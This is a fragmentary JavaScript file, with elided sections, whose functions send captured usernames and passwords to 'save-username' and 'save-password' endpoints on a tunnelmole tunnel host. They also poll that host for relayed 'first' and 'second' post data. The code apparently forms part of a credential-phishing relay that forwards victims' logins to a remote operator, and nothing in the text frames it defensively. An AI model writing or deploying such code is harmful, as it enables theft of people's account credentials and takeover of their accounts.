...
const fetchFreqUsername = async () => {
    ...
    try {
        const response = await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
        ...
        if (result?.postData) {
            ...
            await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
...
const fetchFreqPassword = async () => {
    ...
    try {
        const response = await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });
        ...
        if (result?.postData) {
            ...
            await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
...
const sendUsername = async () => {
    ...
    try {
        const response = await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
...
const sendPassword = async () => {
    ...
    try {
        const response = await fetch('https://0njsiy-ip-37-228-207-173.tunnelmole.net/save-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
